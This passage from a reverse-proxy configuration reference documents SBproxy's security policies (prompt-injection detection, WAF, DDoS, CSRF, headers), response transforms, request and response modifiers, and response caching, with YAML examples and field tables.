| `detector_config.model_signature_path` | path | none | Optional detached Ed25519 signature over the model SHA-256 digest. Configure with tokenizer signature and public key. |
| `detector_config.tokenizer_signature_path` | path | none | Optional detached Ed25519 signature over the tokenizer digest. |
| `detector_config.signature_public_key` | string | none | Ed25519 key as 64 hex characters or a `PUBLIC KEY` PEM block. All three signature fields are required together. |
| `detector_config.max_model_bytes` | integer | `209715200` | Model size budget checked before parsing. The budget measures the `.onnx` file; a model that points at tensors in another file is refused rather than sized. See [What a model file may not do](model-pinning.md#what-a-model-file-may-not-do). |
| `detector_config.max_tokenizer_bytes` | integer | `209715200` | Tokenizer size budget checked before parsing. |
| `detector_config.max_concurrent` | integer | `2` | Running in-process evaluations. Must be in `1..=64`. |
| `detector_config.max_queued` | integer | `16` | Waiting in-process evaluations. Must be in `1..=1024`; later work is refused as `queue_full`. |
| `detector_config.inference_timeout_ms` | integer | `500` | End-to-end local admission and inference deadline. Must be in `1..=30000`. |
| `threshold` | float | `0.5` | Score threshold in `[0.0, 1.0]`; the policy fires when `score >= threshold`. |
| `action` | string | `tag` | `tag` stamps the score / label headers on the upstream. `block` returns `403` with `block_body`. `log` writes a structured warn under `sbproxy::prompt_injection_v2`. |
| `enforcement` | string | none | Optional override for the did-decide axis, shared vocabulary. `block` forces a hit to refuse whatever observe flavor `action` names. `observe` admits every hit: `action: block` downgrades to `log`, `tag` keeps tagging, and the `a2a` depth escalation is downgraded too, so this one key is the whole-policy rollout switch. An explicit `a2a.root_action: log` survives `enforcement: block`. Absent leaves `action` in charge. |
| `score_header` | string | `x-prompt-injection-score` | Header carrying the numeric score (formatted as `"%.3f"`) on `action: tag`. |
| `label_header` | string | `x-prompt-injection-label` | Header carrying `clean` / `suspicious` / `injection` on `action: tag`. |
| `block_body` | string | `prompt injection detected` | Response body returned on `action: block`. |
| `block_content_type` | string | `text/plain` | Content-Type for the block body. |
| `enable_body_aware` | boolean | `false` | Scan the request body as well as the URI + headers. `ai_proxy` prompts and A2A message parts are scored as independent segments (worst-of-N, per-segment caching); on plain origins the buffered body is scanned at the body phase. Off means the body streams through unbuffered and unscanned. The body buffer is capped at 8 MiB; a larger body is rejected with `413` before the scan. Combining with `action: tag` on a non-`ai_proxy` origin fails config compile, because a body hit cannot stamp the tag headers. |
| `a2a.root_action` | string | inherit | `log` or `block`, applied to an agent-to-agent hit at delegation depth 0. Omitted follows `action`, with `tag` resolving to `log`. |
| `a2a.block_above_delegation_depth` | integer or null | `0` | Delegation depth above which an agent-to-agent hit blocks regardless of `a2a.root_action`. Depth 0 is the chain root, so the default blocks any delegated hop. `null` disables the escalation. |

The generic policy scans the request URI + non-auth headers (`Authorization`, `Cookie`, `Set-Cookie` are excluded so tokens carried by design don't self-flag) at request-filter time. Tag mode stamps the score / label headers via the existing trust-headers channel before `upstream_request_filter` builds the upstream request; block mode rejects with `403` immediately. Set `enable_body_aware: true` after measuring false positives to scan buffered request bodies as well; on a plain origin pair it with `block` or `log`, since a body hit arrives after the upstream request is assembled and cannot tag (`tag` + body-aware is refused at config compile there). A body-borne block honors `block_content_type`. See [prompt-injection-v2.md](prompt-injection-v2.md) for the phase table, auto-selection failure boundaries, the eval harness, and custom detector registration.

An unavailable detector is never `clean` and is never cached. Effective
`action: block` fails closed with a generic `503 service unavailable`, ignoring
`block_body` so classifier internals cannot reach the client. `tag` and `log`
continue with the typed `degraded` outcome; tag writes `degraded` to
`label_header` without inventing a numeric score. Deterministic local cache
entries are namespaced by complete model semantics. Remote and composite
detectors bypass that cache. Operational state is available through the
authenticated `GET /admin/prompt-injection-v2` route and
`sbproxy_prompt_injection_classifier_failures_total`.

The `a2a.*` keys apply only when an `a2a` policy is configured on the same origin and the request is detected as A2A 1.0. There is no `tag` in the agent-boundary vocabulary: the scan runs at the request-body phase, after the upstream request header has been built, so there is no header left to stamp. See [prompt-injection-v2.md](prompt-injection-v2.md#the-agent-boundary).

### waf

Web Application Firewall. Built-in patterns cover SQL injection, XSS, and path traversal. Setting `owasp_crs.managed_bundle: true` additionally evaluates the vendored 12-rule CRS-derived bundle that ships in the binary. Custom rules can extend behavior.

```yaml
policies:
  - type: waf
    owasp_crs:
      enabled: true
      managed_bundle: true
    enforcement: block
    failure_posture: closed
    custom_rules: []
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `waf` |
| `owasp_crs` | object | | CRS-style rule configuration. `enabled: true` turns on the built-in patterns; `managed_bundle: true` additionally compiles the vendored 12-rule bundle (independent toggles, either runs without the other); `paranoia_level` sets rule strictness (1-4, default 1) when the top-level `paranoia` field is absent. |
| `enforcement` | string | `block` | What happens when a rule matches: `block` refuses with 403; `observe` admits and records every match, the rollout switch that no rule escapes. A per-rule `action: log` (inline, feed, or bundle) is a permissive override and keeps observing under `block`. Wins over `test_mode` and `action_on_match` in both directions. The second axis, `failure_posture`, covers a rule that could not run at all. |
| `action_on_match` | string | `block` | Legacy spelling of the enforcement axis: `block` or `log`. `log` resolves to `observe`, but only as the default for rules that carry no `action` of their own; a custom rule spelling `action: block` explicitly still blocks. Used only when `enforcement` is absent. |
| `test_mode` | bool | false | Legacy spelling of the enforcement axis: `true` means `enforcement: observe` (no rule blocks). Used only when `enforcement` is absent. |
| `failure_posture` | string | `closed` | What happens to a request the WAF could not fully evaluate: `closed` refuses with 403, `open` admits and claims nothing, `degraded` admits while recording that the WAF guarantee was not made. `observe` is rejected at config load. The shared vocabulary is defined in [degradation.md](degradation.md). |
| `fail_open` | bool | false | Legacy spelling of the failure axis: `true` means `failure_posture: open`, `false` means `closed`. Still parses and is used only when `failure_posture` is absent. |
| `paranoia` | int | 1 | Rule strictness, 1 to 4, gating the built-in patterns, the managed bundle, and any feed rules at once. Only rules whose own paranoia level is at or below this value are evaluated. Level 1 runs 8 of the 16 baseline rules, level 2 runs 15, levels 3 and 4 run all 16. Wins over `owasp_crs.paranoia_level` when both are present. |
| `custom_rules` | list | | Custom WAF rules (regex patterns or JS-defined matchers). A rule without a `paranoia` attribute defaults to 1 and therefore always runs. A feed rule with the same `id` shadows the inline rule. |
| `feed` | object | | Signed remote rule-feed subscription. `enabled`, `transport` (`http` or `redis`), `url` or `redis_url` + `redis_stream`, `channel`, `signature_key_env` (required), `auth_token_env`, `poll_interval` (default 60s), `max_age` (default 86400s, `0` disables), `fallback_to_static` (default true), `cache_dir`, `cache_file`. Bundles are verified with HMAC-SHA256 over the raw body and cached on disk as last-good. See [waf-options.md](waf-options.md) for the bundle format and a publishing recipe. |
| `persistent_block` | object | | Time-boxed blocking for repeat offenders. `enabled`, `strikes` (default 3), `window_secs` (default 60), `block_minutes` (default 10, clamped to 1 to 60), `track_by` (`ip`, `api_key`, or `cel`), `key` (the CEL expression when `track_by: cel`), `max_keys` (default 100000). Backed by the shared rate-limit store, so blocks apply fleet-wide when `proxy.l2_cache` is configured. |

Inspection covers the request URI and the request headers. Request bodies are not scanned by this policy, normalization is a single percent-decode plus a plus-to-space swap, and there is no anomaly scoring or per-path rule exclusion. [waf-options.md](waf-options.md) sets out the boundary in full and covers the alternatives when you need more.

### ddos

DDoS protection with per-IP rate tracking and temporary blocks.

```yaml
policies:
  - type: ddos
    requests_per_second: 100
    block_duration_secs: 300
    whitelist:
      - 10.0.0.0/8
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `ddos` |
| `requests_per_second` | int | 100 | Per-IP threshold that triggers blocking. |
| `block_duration_secs` | int | 300 | Duration in seconds an IP stays blocked once the threshold trips. |
| `whitelist` | list | `[]` | CIDR ranges that bypass DDoS checks. |
| `detection` | object | | Go-compat nested form. When `detection.request_rate_threshold` is set, it overrides `requests_per_second`. |
| `mitigation` | object | | Go-compat nested form. When `mitigation.block_duration` is set as a Go duration string (`10s`, `5m`, `1h`), it overrides `block_duration_secs`. |

### csrf

Cross-Site Request Forgery protection for web applications that accept form submissions.

```yaml
policies:
  - type: csrf
    secret_key: ${CSRF_SECRET}
    cookie_name: csrf_token
    header_name: X-CSRF-Token
    methods: [POST, PUT, DELETE, PATCH]
    safe_methods: [GET, HEAD, OPTIONS]
    cookie_path: /
    cookie_same_site: Lax
    exempt_paths: [/api/webhooks, /api/health]
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `csrf` |
| `secret_key` | string | required | HMAC key used to sign CSRF tokens. Alias: `secret`. |
| `header_name` | string | `X-CSRF-Token` | Header carrying the CSRF token |
| `cookie_name` | string | `csrf_token` | Cookie carrying the canonical CSRF token |
| `methods` | list | | Methods that require CSRF token validation. When empty, falls back to "anything not in `safe_methods`". |
| `safe_methods` | list | `[GET, HEAD, OPTIONS]` | Methods exempt from CSRF checking |
| `cookie_path` | string | | Cookie path |
| `cookie_same_site` | string | | SameSite attribute (`Strict`, `Lax`, `None`) |
| `exempt_paths` | list | | Paths exempt from CSRF checking |

`csrf` mints a token on every safe-method response, whether or not the
caller already holds one, and the proxy appends it as a `Set-Cookie`. If
this origin also enables `response_cache`, a stored entry can replay that
cookie to a later caller, which hands a second caller the first caller's
token. Read
[Who a cached entry belongs to](#who-a-cached-entry-belongs-to) before
combining the two.

### request_limit

Cap request body size, header count, header value size, URL length, and query string length. Any field left unset means that dimension is not checked.

```yaml
policies:
  - type: request_limit
    max_body_size: 1048576
    max_header_count: 50
    max_header_size: 8KB
    max_url_length: 2048
    max_query_string_length: 1024
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max_body_size` | int | unset | Maximum request body size in bytes. Checked against a declared `Content-Length` in the request phase and against the running total as chunks arrive, so a chunked upload that declares nothing is caught too. It also bounds what a linked Rust action plugin buffers before it runs: that action answers from the request phase and returns, so it never reaches the streaming check and applies this cap itself. Left unset it still buffers no more than 64 MiB, and a value above 1 GiB is clamped there. A proxied request has no body cap without this field. `type: ai_proxy` has the same problem and its own key, [`max_body_size` on the action](#ai_proxy), which is the one it reads. |
| `max_header_count` | int | unset | Maximum number of request headers. Alias: `max_headers_count`. |
| `max_header_size` | int or string | unset | Maximum size of a single header value. Strings like `"4KB"` or `"1MB"` are accepted. |
| `max_url_length` | int | unset | Maximum URL length in characters. |
| `max_query_string_length` | int | unset | Maximum query string length in characters. |
| `max_request_size` | int or string | unset | Go-compat overall request size cap. Same string-or-number rules as `max_header_size`. |
| `size_limits` | object | | Go-compat nested form. When set, fields here are merged into the policy at load time. |

### security_headers

Inject security headers into every response to harden browser security.

```yaml
policies:
  - type: security_headers
    headers:
      - name: Strict-Transport-Security
        value: "max-age=31536000; includeSubDomains; preload"
      - name: X-Frame-Options
        value: DENY
      - name: X-Content-Type-Options
        value: nosniff
      - name: Referrer-Policy
        value: strict-origin-when-cross-origin
      - name: Permissions-Policy
        value: "camera=(), microphone=(), geolocation=()"
    # Optional: the Content-Security-Policy, set here rather than as a
    # `headers:` entry when you want a nonce, report-only mode, a report
    # URI, or per-route overrides.
    content_security_policy:
      policy: "default-src 'self'; script-src 'self' https://cdn.example.com"
      enable_nonce: false
      report_only: false
      report_uri: ""
```

`headers` is a list of `{name, value}` pairs for any response header (HSTS, Cross-Origin-*, COEP/COOP/CORP, Referrer-Policy, Permissions-Policy, and so on). The optional `content_security_policy` block sets the Content-Security-Policy and adds what a `{name, value}` pair cannot express: per-request nonce injection, report-only mode, a report URI, and per-route overrides.

The two compose. A `content_security_policy` block ships alongside a `headers` array, and every knob on it applies whether or not `enable_nonce` is set. Set the CSP in one place or the other, not both: the block is the single source of truth for that header, and a config that also puts a `Content-Security-Policy` entry in `headers` is refused at compile rather than having one of them dropped quietly. A plain static policy is fine either way, as a `headers` entry or as `content_security_policy: "default-src 'self'"`.

Each emitted policy increments `sbproxy_security_headers_csp_emitted_total`, labeled by `mode` (`enforce` or `report_only`) and tenant. If you configured a CSP and that series sits at zero, the header is not reaching browsers.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `security_headers`. |
| `headers` | list | `[]` | Canonical `{name, value}` pairs to inject. Supersedes the legacy flat fields below, which are logged as dropped when both are set. Composes with `content_security_policy`. |
| `content_security_policy` | string or object | | CSP. Either a plain policy string or an object (see below). Composes with `headers`; setting the CSP in both places is refused. |
| `x_frame_options` | string | | Legacy flat shortcut. Deprecated. |
| `x_content_type_options` | string | | Legacy flat shortcut. Deprecated. |
| `x_xss_protection` | string | | Legacy flat shortcut. Deprecated. |
| `referrer_policy` | string | | Legacy flat shortcut. Deprecated. |
| `permissions_policy` | string | | Legacy flat shortcut. Deprecated. |
| `strict_transport_security` | string | | Legacy flat HSTS shortcut. Deprecated. |

When `content_security_policy` is an object, it accepts:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `policy` | string | `""` | The CSP policy string. Required unless `dynamic_routes` is set: a block that can emit no header is refused at compile. |
| `enable_nonce` | bool | false | When true, generate a per-request nonce and inject it into `script-src` / `style-src` directives. |
| `report_only` | bool | false | When true, emit `Content-Security-Policy-Report-Only` instead of `Content-Security-Policy`. Applies whether or not `enable_nonce` is set. |
| `report_uri` | string | `""` | Appended to the policy as `; report-uri <uri>` when set. |
| `dynamic_routes` | map | `{}` | Per-route CSP overrides keyed by URL path. Exact key match wins, then longest matching prefix. |

### sri

Subresource Integrity validation. When `enforce` is true, sub-resource responses must include valid integrity hashes using one of the configured algorithms.

```yaml
policies:
  - type: sri
    enforce: true
    algorithms: [sha256, sha384, sha512]
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `sri`. |
| `enforce` | bool | false | When true, missing or invalid integrity hashes cause the response to be rejected. |
| `algorithms` | list | `[]` | Accepted integrity hash algorithms (e.g. `sha256`, `sha384`, `sha512`). |

### assertion

CEL assertion policy. Evaluates a CEL expression and logs/flags when it returns false. Unlike `expression`, assertions do not block traffic; they are informational only.

```yaml
policies:
  - type: assertion
    expression: 'response.status_code < 500'
    name: "no-server-errors"
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `expression` | string | required | CEL expression evaluated for its truth value |
| `name` | string | "assertion" | Human-readable name attached to assertion log entries |

### owasp_api_top10 (pack)

Not one of the thirty policy types above. `owasp_api_top10` is a
pseudo-policy: the compiler reads it before any policy is compiled,
expands it into the real synthesized policies and transforms named
below, and removes this entry so it never reaches a policy module's own
parser. See [owasp-api-top10.md](owasp-api-top10.md) for what every
`api1`..`api10` item synthesizes and why, and
[api-security.md](api-security.md#the-owasp_api_top10-pack) for the
same coverage configured by hand.

```yaml
policies:
  - type: owasp_api_top10
    enable: all                # or a list: [api1, api4, api5, api7, api8]
    posture: report_only       # pack-wide default; also the default when omitted
    per_item:
      api1:
        posture: enforce
      api3:
        response_exclude_fields: [ssn, internal_notes]
      api4:
        rps: 50                # confirm proxy.trusted_proxies first; see below
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enable` | `"all"` or list | required | `"all"` turns on all ten items; a list names a subset by id (`api1`..`api10`, case-insensitive). Duplicates and unknown ids fail at compile time with the accepted list. |
| `posture` | string | `report_only` | Pack-wide default: `enforce` or `report_only`. Threads into a synthesized policy's own report-only knob when one exists. Only `api1`/`api5`'s shared `object_authz` entry has one today; every other synthesized policy in this pack enforces (or, for `security_headers`, injects) regardless of posture. |
| `per_item.<item>.posture` | string | pack-wide `posture` | Overrides posture for one enabled item. Refused if `<item>` is not also named in `enable`. |
| `per_item.api3.response_exclude_fields` | list of strings | unset | `api3`-only. Field names to strip from the **top level** of JSON *object* response bodies (an array body, or a nested field, is out of scope); supplying this synthesizes a `json_projection` transform with `failure_posture: closed`. Refused on any other item, and refused if given as an empty list. |
| `per_item.api4.rps` | number | unset | `api4`-only. Requests-per-second budget for the pack's `rate_limiting` and `ddos_protection` pieces; supplying it is what synthesizes both. Both key on caller IP by default - confirm `proxy.trusted_proxies` covers any load balancer in front of this origin before setting this, or every real client collapses to one shared budget. Refused on any other item, and refused if not a positive number. |

The origin already authoring a policy of the type an item would
synthesize backs that item off entirely (state `operator_authored` in
the manifest); an origin authoring `object_authz` itself, for example,
gets no `api1`/`api5` synthesis on top of it. The resolved outcome for
every enabled item, including the ones with no synthesis wired, is
available at `GET /admin/owasp-api-pack`
([admin-api-reference.md](admin-api-reference.md#get-adminowasp-api-pack))
and in `sbproxy plan`'s text output.

### geoip

Resolve the client IP to country, continent, city, and ASN against a
MaxMind-compatible `.mmdb`. A producer, not a gate: it never denies, and
a missing database or an unresolved client IP is a metric outcome rather
than an error. Full page: [request-enrichment.md](request-enrichment.md).

```yaml
policies:
  - type: geoip
    # Path to a MaxMind-compatible .mmdb file. Optional. Omitted, the
    # policy falls back to the binary's embedded copy, which is a
    # zero-byte placeholder in an OSS build, so the lookup records
    # `result="no_database"` and adds nothing.
    database_path: /opt/geoip/GeoLite2-City.mmdb
    # Stamp X-Geo-Country, X-Geo-Continent, X-Geo-City, and X-Geo-Asn on
    # the upstream request for the fields the lookup found. Default true.
    inject_headers: true
```

### user_agent_parser

Parse the `User-Agent` header into browser, OS, and device type, plus a
headless-automation-library label (`headless_chrome`, `phantomjs`,
`puppeteer`, `playwright`, `selenium`). Independent of the JA4-based
headless detector, which reads the TLS fingerprint rather than the
header; a request can trip either, both, or neither. Also never denies.
Full page: [request-enrichment.md](request-enrichment.md).

```yaml
policies:
  - type: user_agent_parser
    # Header carrying the parse result as JSON on the upstream request.
    # Default "x-parsed-ua".
    inject_header: x-parsed-ua
    # Whether to stamp `inject_header` at all. Default true; set false to
    # populate the request context for hooks without touching the
    # upstream request.
    inject: true
```

Both policies feed `geo_country`, `geo_asn`, and `ua_headless_library`
to any registered `AnomalyDetectorHook` or `IdentityResolverHook`
whether or not header injection is on. Runnable:
[`examples/request-enrichment/`](../examples/request-enrichment/).

---

## Transforms

Transforms modify the response body before it reaches the client. They are specified as a list under `transforms` and run in order. Reach for transforms when you need to reshape API responses for different consumers.

SBproxy supports twenty-eight transform types: `json`, `json_projection`, `json_schema`, `ai_schema`, `template`, `replace_strings`, `normalize`, `encoding`, `format_convert`, `payload_limit`, `discard`, `sse_chunking`, `html`, `optimize_html`, `html_to_markdown`, `markdown`, `pdf_markdown`, `css`, `lua`, `lua_json`, `javascript`, `js_json`, `wasm`, `boilerplate`, `citation_block`, `json_envelope`, `cel`, `a2a_agent_card_rewrite`, plus a `noop` for testing. `pdf_markdown` needs the optional `transform-pdf` build; every other type is in the default binary.

### json

Reshape JSON responses by setting or merging fields.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    transforms:
      - type: json
        # Field-level edits handled by this transform.
```

For include/exclude projection, use `json_projection`. The field list is flat on the transform itself, under `fields:` (alias `include:`); there is no nested `projection:` key, and a config using one fails at load with `missing field 'fields'`.

```yaml
transforms:
  - type: json_projection
    fields: [id, name, email, role]
```

Or to remove sensitive fields, list them under `fields:` and set `exclude: true`:

```yaml
transforms:
  - type: json_projection
    fields: [password, ssn, internal_notes]
    exclude: true
```

The field reference for this transform is in the [json_projection](#json_projection) section below.

### html

Modify HTML responses by removing elements, injecting content at known positions, and rewriting attributes.

```yaml
transforms:
  - type: html
    remove_selectors: [script, "#banner"]
    inject:
      - position: head_end
        content: '<link rel="stylesheet" href="https://cdn.example.com/override.css">'
      - position: body_start
        content: '<div id="banner">Maintenance scheduled for tonight</div>'
      - position: body_end
        content: '<script src="https://cdn.example.com/analytics.js"></script>'
    rewrite_attributes:
      - selector: img
        attribute: loading
        value: lazy
    format_options:
      strip_comments: true
      strip_space: true
      lowercase_tags: false
```

`position` accepts `head_end`, `body_start`, or `body_end`. Each `inject` entry is `{position, content}`.

### css

Modify CSS responses by injecting rules, removing rule blocks for specific selectors, and minifying.

```yaml
transforms:
  - type: css
    inject:
      - "body { background: #fafafa; }"
    remove_selectors: [".legacy-banner"]
    minify: true
```

### Common transform fields

Every entry in the `transforms:` list is wrapped with these pipeline-level fields, parsed by `TransformConfig`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Transform type discriminator (e.g. `json`, `template`). |
| `content_types` | list | `[]` | Content-Type substrings the transform applies to. Empty matches all. |
| `failure_posture` | string | `open` | What happens to the response when this transform fails: `closed` replaces the body with a generic error instead of forwarding it, `open` skips the failed transform and continues with the next one. `degraded` and `observe` are rejected at config load. The shared vocabulary is defined in [degradation.md](degradation.md). |
| `fail_on_error` | bool | false | Legacy spelling of the failure axis: `true` means `failure_posture: closed`, `false` means `open`. Still parses and is used only when `failure_posture` is absent; setting both to values that disagree is a config-load error. |
| `max_body_size` | int | 10485760 | Maximum body size, in bytes, this transform is willing to see. What a larger body does depends on `failure_posture`: under `open` the transform is skipped and the body passes through unmodified; under `closed` the response fails, because a body the transform never saw must not reach the client. On the proxied-response path the buffer is shared, sized to the largest cap across the origin's transforms, so a transform with a smaller cap still runs on bodies up to that shared size; on plugin-action responses the cap applies per transform. On an origin with `response_cache`, a body over the cap is passed through under `open` but never stored, so the cache only ever holds bodies the chain actually processed. |
| `disabled` | bool | false | When true, the transform is parsed but not applied. |

Type-specific fields are listed below.

### json (field manipulation)

Reshape JSON by setting, removing, and renaming fields.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `set` | map | `{}` | Fields to set or overwrite. Values may be any JSON. |
| `remove` | list | `[]` | Field names to delete. |
| `rename` | map | `{}` | `old_name -> new_name` mapping. Renames happen before `set`. |

### json_projection

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `fields` | list | required | Field names to keep (default) or drop (when `exclude` is true). Alias: `include`. |
| `exclude` | bool | false | When true, drop the listed fields instead of keeping them. |

### json_schema

Validate the response body against a JSON Schema document. Schemas are compiled at config-load time. Remote `$ref` resolution is disabled to prevent SSRF.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `schema` | object | required | The JSON Schema document. |

### template

Render the JSON body as input to a minijinja template.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `template` | string | required | Template source with `{{ variable }}` syntax. |

### replace_strings

Apply a list of literal or regex find-and-replace rules to the body.

```yaml
- type: replace_strings
  replacements:
    - find: "internal.example.com"
      replace: "public.example.com"
    - find: '\d{16}'
      replace: "[REDACTED]"
      regex: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `replacements` | list | required | Ordered list of replacement rules. |
| `replacements[].find` | string | required | Literal substring or regex pattern. |
| `replacements[].replace` | string | required | Replacement string. |
| `replacements[].regex` | bool | false | When true, treat `find` as a regex. |

### normalize

Whitespace and newline normalization.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `trim` | bool | false | Trim leading and trailing whitespace. |
| `collapse_whitespace` | bool | false | Collapse runs of spaces and tabs into a single space. |
| `normalize_newlines` | bool | false | Replace `\r\n` with `\n`. |

### encoding

Base64 or URL encode/decode the body.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `encoding` | string | required | One of `base64_encode`, `base64_decode`, `url_encode`, `url_decode`. |

### format_convert

Convert between JSON and YAML.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `from` | string | required | Source format: `json` or `yaml`. |
| `to` | string | required | Target format: `json` or `yaml`. |

### payload_limit

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max_size` | int | required | Maximum allowed body size in bytes. |
| `truncate` | bool | false | When true, truncate to `max_size`. When false, error on oversize. |

### discard

Drop the response body entirely. Takes no fields.

```yaml
- type: discard
```

### sse_chunking

Format the body as Server-Sent Events with the configured prefix and double-newline delimiters.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `line_prefix` | string | `"data: "` | Prefix prepended to each non-empty line. |

### optimize_html

Minify HTML by removing comments and collapsing whitespace.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `remove_comments` | bool | true | Strip `<!-- ... -->` comments. |
| `collapse_whitespace` | bool | true | Collapse runs of whitespace into a single space (preserves `<pre>` and `<code>` content). |
| `remove_optional_tags` | bool | false | Remove optional closing tags such as `</li>`, `</p>`, `</tr>` (experimental). |

### html_to_markdown

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `heading_style` | string | `"atx"` | Heading style: `atx` (uses `#`), `setext` (underline). |

### markdown

Convert Markdown to HTML using `pulldown-cmark`.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `smart_punctuation` | bool | false | Enable smart punctuation (curly quotes, dashes). |
| `tables` | bool | false | Enable GitHub-flavored tables. |
| `strikethrough` | bool | false | Enable `~~strikethrough~~`. |

### Scripting transforms

`lua_json` runs a Lua script against a parsed JSON body. `javascript` and `js_json` run JavaScript. Each is documented in [scripting.md](scripting.md). Replace any `type: lua` references in older configs with `type: lua_json`.

| Type | Field | Default | Description |
|------|-------|---------|-------------|
| `lua_json` | `script` | required | Lua source. The Go-format function name is `modify_json(data, ctx)`; legacy scripts may use a `body` global. Alias: `lua_script`. |
| `javascript` | `script` | required | JavaScript source. |
| `javascript` | `function_name` | `transform` | Entrypoint function name. Receives the body as a string and `ctx` as the second argument. |
| `js_json` | `script` | required | JavaScript source. Alias: `js_script`. |
| `js_json` | `function_name` | `modify_json` | Entrypoint function name. Receives the parsed JSON body and `ctx` as the second argument. |

Lua and JavaScript transform contexts include `ctx.request.aipref.train`,
`ctx.request.aipref.search`, and `ctx.request.aipref.ai_input`. Missing or
malformed `aipref` headers leave all three values at `true`.

---

## Request modifiers

![A request gaining an injected header and a rewritten path before the upstream sees it](assets/request-modifiers.gif)

([config](../examples/request-modifiers/))

Request modifiers run before the action and edit the request. Each entry is an object with one or more of `headers`, `url`, `query`, `method`, `body`, `lua_script`, or `js_script`. Multiple entries are applied in order.

### Header / URL / query / method / body

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    request_modifiers:
      - headers:
          set:
            X-Source: sbproxy
          add:
            X-Trace-Id: "{{ request.headers.x_request_id }}"
          remove:
            - X-Internal-Token
        url:
          path:
            replace:
              old: /old/
              new: /new/
        query:
          set:
            tenant: prod
          add:
            extra: "1"
          remove:
            - debug
        method: POST
        body:
          replace_json:
            injected: true
            source: proxy
```

| Field | Type | Description |
|-------|------|-------------|
| `headers.set` | map | Replace headers (overwrites existing) |
| `headers.add` | map | Append headers (preserves existing) |
| `headers.remove` | list | Remove headers (alias: `delete`) |
| `url.path.replace.old` | string | Substring to find in the request path |
| `url.path.replace.new` | string | Replacement string |
| `query.set` | map | Replace query parameters |
| `query.add` | map | Append query parameters |
| `query.remove` | list | Remove query parameters (alias: `delete`) |
| `method` | string | Override the HTTP method |
| `body.replace` | string | Replace the body with this string |
| `body.replace_json` | object | Replace the body with this JSON value |

### Scripted request modifiers

Each modifier entry can supply a `lua_script` or `js_script` instead of (or in addition to) the structured fields above. Scripts run with full access to the request context. See [scripting.md](scripting.md) for the script API.

```yaml
request_modifiers:
  - lua_script: |
      local access_level = "guest"
      if ip.in_cidr(request_ip, "10.0.1.0/24") then
        access_level = "admin"
      end
      request.headers["X-Access-Level"] = access_level
      return request
```

```yaml
request_modifiers:
  - js_script: |
      function modify_request(req, ctx) {
        req.headers["X-Injected"] = "from-js";
        return req;
      }
```

---

## Response modifiers

![An upstream response with headers rewritten and a body substitution applied on the way out](assets/response-modifiers.gif)

([config](../examples/response-modifiers/))

Response modifiers run after the action and edit the response. Each entry is an object with one or more of `headers`, `status`, `body`, `lua_script`, or `js_script`. Multiple entries are applied in order.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    response_modifiers:
      - headers:
          set:
            X-Content-Type-Options: nosniff
            X-Frame-Options: DENY
          remove:
            - Server
            - X-Powered-By
        status:
          code: 200
          text: OK
        body:
          replace: '{"ok": true}'
```

| Field | Type | Description |
|-------|------|-------------|
| `headers.set` | map | Replace headers |
| `headers.add` | map | Append headers |
| `headers.remove` | list | Remove headers (alias: `delete`) |
| `status.code` | int | Override the response status code |
| `status.text` | string | Custom reason phrase for the HTTP/1.x status line. Absent means the canonical phrase for `code`. HTTP/2 has no reason phrase on the wire, so it is ignored there. |
| `body.replace` | string | Replace the response body with this string |
| `body.replace_json` | object | Replace the response body with this JSON value |

For JSON-field-level edits (set fields, delete fields, etc.), use the `json` transform rather than a response modifier.

### Scripted response modifiers

```yaml
response_modifiers:
  - lua_script: |
      if location.country_code ~= "US" and location.country_code ~= "CA" then
        response.status_code = 451
        response.body = '{"error": "Content not available in your region"}'
      end
      return response
```

```yaml
response_modifiers:
  - js_script: |
      function modify_response(res, ctx) {
        res.headers["X-Injected"] = "from-js";
        return res;
      }
```

---

## Response cache

Cache responses at the origin level to reduce backend load and improve response times for cacheable content. The `response_cache` block is a sibling of `action`.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    response_cache:
      enabled: true
      ttl_secs: 300
      cacheable_methods: [GET, HEAD]
      cacheable_status: [200, 301]
      max_size: 10000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Enable response caching |
| `ttl_secs` | duration | 300 | Cache entry TTL. Accepts integers (`60`) or humanized strings (`60s`, `5m`, `2h30m`). Alias: `ttl`. |
| `cacheable_methods` | list | `[GET]` | HTTP methods eligible for caching. Only `GET` and `HEAD` are accepted; anything else is refused at config load. Alias: `methods`. |
| `cacheable_status` | list | `[200]` | Status codes eligible for caching. Alias: `status_codes`. |
| `max_size` | int | 10000 | Upper bound on the in-memory cache size in entries. Ignored when an L2 Redis backend is attached. |
| `key_event` | object | unset | Request-side `cache.key` decision event: an inline `source` plus an `engine`, returning the dimensions to fold into the cache key. See [Deciding the key and the admission per request](#deciding-the-key-and-the-admission-per-request). |
| `admit_event` | object | unset | Response-side `cache.admit` decision event: the same shape, returning whether the finished response is stored and for how long. |
| `epoch` | int | 0 | Operator-controlled cache generation. Bumping it rotates this origin's entries and nothing else. See [Which config changes rotate the cache](#which-config-changes-rotate-the-cache). |

